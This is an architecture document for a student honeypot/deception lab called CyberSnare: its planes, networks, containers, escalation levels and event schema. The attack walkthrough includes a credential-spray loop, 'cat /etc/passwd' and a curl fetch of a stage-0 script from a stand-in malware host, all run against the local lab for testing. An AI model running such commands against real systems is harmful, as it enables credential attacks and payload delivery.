# CyberSnare — Full Lab Architecture

**Document:** Milestone 1 lab architecture (local + org)  
**Version:** 1.0 · August 2026  
**Audience:** FYP viva, operators, red-team evaluators

---

## 1. Are dashboard events real or demo?

| Question | Answer |
|----------|--------|
| Are events **real**? | **Yes** — every row is a real JSON line appended to `data/events/events.jsonl` by running services (Zeek, SSH, HTTPS, sinkhole, decision). |
| Is the dashboard **fake**? | **No** — it reads the live JSONL file and aggregates it. Refresh shows current lab state. |
| Is there **seed/demo data**? | **No seed file.** High volume (e.g. 19k+ events) comes from Zeek continuously logging connections on the deception network, verify scripts, and `./cs redteam`. |
| What is **simulated**? | **Deception surfaces** (fake NexusCorp portal, fake SSH host, sinkhole malware domains) — but the **telemetry is real**. |
| What is **not built yet**? | Separate **attacker VM**, public internet exposure, L3 immerse actuators, 4-week study data. |

**Rule:** If you did not run traffic, you still see Zeek background events from internal sensor health traffic (`ip:10.200.1.20`). Attacker-origin traffic appears as `ip:127.0.0.1` or your LAN IP when you curl/ssh from the host.

---

## 2. Where is the attacker VM?

### Local lab (what you have now)

**There is no attacker VM in the default local lab.**

```
┌─────────────────────────────────────────────────────────────┐
│  YOUR FEDORA HOST (attacker role)                           │
│  You run: curl, ssh, nmap, ./cs redteam                     │
│       │                                                     │
│       ▼ 127.0.0.1 only (no 0.0.0.0)                         │
│  ┌─────────────────────────────────────────────────────┐   │
│  │  PODMAN STACK — CyberSnare target / control plane    │   │
│  │  :2222 SSH  :8443 HTTPS  :18090 dashboard            │   │
│  └─────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────┘
```

| Role | Where it runs | Notes |
|------|---------------|-------|
| **Attacker** | Your host terminal | `ssh -p 2222 user@127.0.0.1`, `curl -sk https://127.0.0.1:8443/` |
| **Target (deception)** | `cs-sensor` netns + ssh/http containers | Shared deception network namespace |
| **Victim org** | Not on internet | Lab binds localhost only by design |
| **Sandbox (post-exploit)** | `cs-sandbox` on egress net | Shell runs here after L2 auth |

### Org deployment (thesis target — not required for milestone 1)

```
Internet → cs-edge (real nginx site + firewall)
              │ WireGuard
              ▼
           cs-lab (k3s) — deception + control plane
```

Attacker would be an **external machine** or red-team VLAN hitting the **edge public IP**. Scripts: `deploy/scripts/bootstrap-edge.sh`, `deploy/org/TOPOLOGY.md`.

### Optional: add a real attacker VM (your choice)

```bash
# Second machine or VM on same LAN:
ssh -p 2222 probe@<FEDORA_HOST_IP>    # only if you explicitly publish ports (NOT default)
```

Default `./cs up` **blocks** this — ports are `127.0.0.1` only per security contract.

---

## 3. Four planes architecture

```
                    ┌──────────────────────────────────────┐
                    │         INTELLIGENCE PLANE           │
                    │  logger · intelligence :18090        │
                    │  JSONL · ATT&CK · SIEM dashboard     │
                    └──────────────────▲───────────────────┘
                                       │ read / ingest
┌──────────────┐    events    ┌────────┴────────┐    manifest
│ SENSOR PLANE │─────────────►│ DECISION PLANE  │──────────────┐
│ Zeek HASSH   │              │ belief · policy │              │
│ JA4 ingest   │              │ P0/P1/P2        │              │
└──────▲───────┘              └────────▲────────┘              │
       │ sniff                         │ events                 │ poll /v1/manifest
       │                               │                        ▼
┌──────┴──────────────────────────────────────────────────────────────┐
│                     DECEPTION PLANE                                    │
│  HTTPS :8443 · SSH :2222 · sandbox shell · sinkhole · decoy nginx     │
└──────────────────────────────────────────────────────────────────────┘
```

| Plane | Containers | IP (mgmt) | Function |
|-------|------------|-----------|----------|
| **Sensor** | cs-sensor, cs-zeek-ingest | .20, .23 | Zeek on deception net; HASSH/JA4 |
| **Decision** | cs-decision, cs-gnn, cs-intent* | .11, .12, .13 | Per-actor belief, manifest merge |
| **Deception** | cs-ssh, cs-http (in sensor netns), cs-sinkhole, cs-sandbox | .22, egress | Surfaces + sinkhole stage-0 |
| **Intelligence** | cs-logger, cs-intelligence | .10, .14 | Append-only JSONL + dashboard |

\* intent worker only with `./cs up-adaptive` or `./cs up-p2`

---

## 4. Network topology (local lab)

```
NETWORK          CIDR              CONTAINERS
─────────────────────────────────────────────────────────
mgmt             10.200.1.0/24     logger .10, decision .11, gnn .12,
                                   intelligence .14, sensor-mgmt .20,
                                   zeek-ingest .23, sinkhole-mgmt .22

deception        10.200.2.0/24     sensor .10 (SSH+HTTPS+Zeek share netns)

egress           10.200.3.0/24     sinkhole .2, sandbox .10

internal         10.200.4.0/24     gitlab-decoy .10, ldap-decoy .11 (L3 prep)

HOST LOOPBACK (attacker path):
  127.0.0.1:2222  → deception SSH
  127.0.0.1:8443  → deception HTTPS
  127.0.0.1:18088 → logger API
  127.0.0.1:19000 → decision API
  127.0.0.1:18090 → intelligence / SIEM dashboard
```

All bridges are **internal** — no container reaches the real internet. Sandbox DNS → sinkhole only.

---

## 5. Recon → deception full flow

### Phase A — Reconnaissance (L1, auth closed)

| Step | Attacker action | What happens | Event dataset |
|------|-----------------|--------------|---------------|
| 1 | `curl -sk https://127.0.0.1:8443/` | HTTPS portal loads (NexusCorp persona) | `cybersnare.zeek.http`, `cybersnare.http.request` |
| 2 | `ssh -p 2222 probe@127.0.0.1` | Real SSH KEX, auth refused | `cybersnare.zeek.ssh`, `cybersnare.ssh.auth` |
| 3 | Zeek captures traffic | HASSH + JA4 fingerprints stored | `cybersnare.zeek.conn`, `.ssl` |
| 4 | Decision ingests events | Updates per-actor **belief** (intent, score) | (internal) |
| 5 | Manifest stays L1 | Surfaces visible, login returns **401** | engage EAC0003 |

### Phase B — Credential spray (triggers escalation on Arm B/C)

```bash
./cs up-adaptive          # Arm B — P1 dynamic policy
for i in 1 2 3 4 5; do
  curl -sk -X POST https://127.0.0.1:8443/login -d "username=admin&password=wrong$i"
  ssh -o BatchMode=yes -p 2222 "user$i@127.0.0.1" true
done
```

| Outcome | Policy | Result |
|---------|--------|--------|
| Arm A (P0) | Static | Stays L1 — no transition |
| Arm B (P1) | Utility + GNN | May escalate to **L2** after ~4+ events |
| Arm C (P2) | Intent-conditioned | Escalates based on inferred objective |

Transition logged as: `cybersnare.decision.transition` → dashboard **Manifest transitions** counter increases.

### Phase C — Engagement (L2 shell)

```bash
./cs gate                 # 19 security properties
./cs set-level L2         # pin manifest (or wait for P1 auto-escalation)

ssh -p 2222 guest@127.0.0.1    # password: nexus2024 (config/shell-users.json)
```

Inside shell (sandbox, egress sinkhole only):

```bash
whoami
ls
cat /etc/passwd
curl http://malware.example/stage0.sh   # → sinkhole, logged as T1105
```

### Phase D — Intelligence / SIEM view

| Tool | URL / command | Shows |
|------|---------------|-------|
| Dashboard | http://127.0.0.1:18090/ | Charts, ATT&CK, actors, timeline |
| Monitor | `./cs monitor` | Live belief + transitions |
| Raw log | `data/events/events.jsonl` | Every event line |
| Report API | `curl http://127.0.0.1:18090/v1/report` | Milestone aggregates |

---

## 6. Experimental arms (thesis)

| Arm | Command | Policy | Deception behaviour |
|-----|---------|--------|---------------------|
| **A** | `./cs up` | P0 static | Fixed L1 manifest, no auto-escalation |
| **B** | `./cs up-adaptive` | P1 + GNN | Dynamic L1→L2→L3 from utility score |
| **C** | `./cs up-p2` | P2 + intent worker | Manifest from inferred attacker objective |

---

## 7. Deception levels

| Level | Attacker sees | Auth | Shell | Engage |
|-------|---------------|------|-------|--------|
| **L0** | Nothing exposed | — | — | EAC0001 Observe |
| **L1** | Portal + SSH banner | Closed (401/denied) | No | EAC0003 Attract |
| **L2** | Same surfaces | Open | Restricted sandbox | EAC0005 Engage |
| **L3** | Internal decoys | Open | Deeper immerse (partial) | EAC0005 |
| **BURN** | Surfaces withdrawn | — | — | Disengage |

---

## 8. Container inventory

| Container | Image | Purpose |
|-----------|-------|---------|
| cs-decision | cybersnare-python | Manifest engine, belief state |
| cs-logger | cybersnare-python | JSONL append, event API |
| cs-intelligence | cybersnare-python | SIEM dashboard + analytics |
| cs-gnn | cybersnare-gnn | Graph scorer (Arm B/C) |
| cs-intent | cybersnare-python | Slow-path intent (Arm B/C) |
| cs-sensor | cybersnare-zeek | Zeek tap on deception net |
| cs-ssh | cybersnare-python | asyncssh deception surface |
| cs-http | cybersnare-python | HTTPS deception surface |
| cs-zeek-ingest | cybersnare-python | Zeek log → JSONL |
| cs-sinkhole | cybersnare-python | DNS/HTTP stage-0 sinkhole |
| cs-sandbox | cybersnare-python | Isolated shell runtime |
| cs-gitlab-decoy | nginx | Internal decoy (L3 prep) |
| cs-ldap-decoy | nginx | Internal decoy (L3 prep) |

---

## 9. Event envelope (one line = one fact)

```json
{
  "@timestamp": "2026-08-31T14:00:00.000Z",
  "event": { "dataset": "cybersnare.ssh.auth", "action": "auth-failed" },
  "session": { "actor_key": "ip:127.0.0.1", "arm": "A", "level": "L1" },
  "source": { "ip": "127.0.0.1", "port": 54321 },
  "network": { "hassh": "...", "ja4": "..." },
  "threat": { "technique": { "id": "T1078" } },
  "deception": { "engage_activity": "EAC0003" }
}
```

Schema: `config/event-schema.json` · Mappings: `lib/cs/mappings.py`

---

## 10. Quick operator commands

```bash
./cs up                  # start lab
./cs verify              # 16 integration checks
./cs up-adaptive         # Arm B dynamic deception
./cs redteam             # scripted attacker profiles
./cs set-level L2        # open shell auth
./cs monitor             # live control plane
./cs analyze             # milestone report JSON
open http://127.0.0.1:18090/   # SIEM dashboard
```

---

## 11. What is out of scope (milestone 1)

- Dedicated attacker VM (you are the attacker on localhost)
- Public `0.0.0.0` exposure
- Real internet egress from sandbox
- Full L3 immerse internal hop
- Pre-collected 4-week three-arm study data (scripts ready, collection not run)

---

*CyberSnare FYP · Air University · Generated from live codebase compose.yml and design record.*
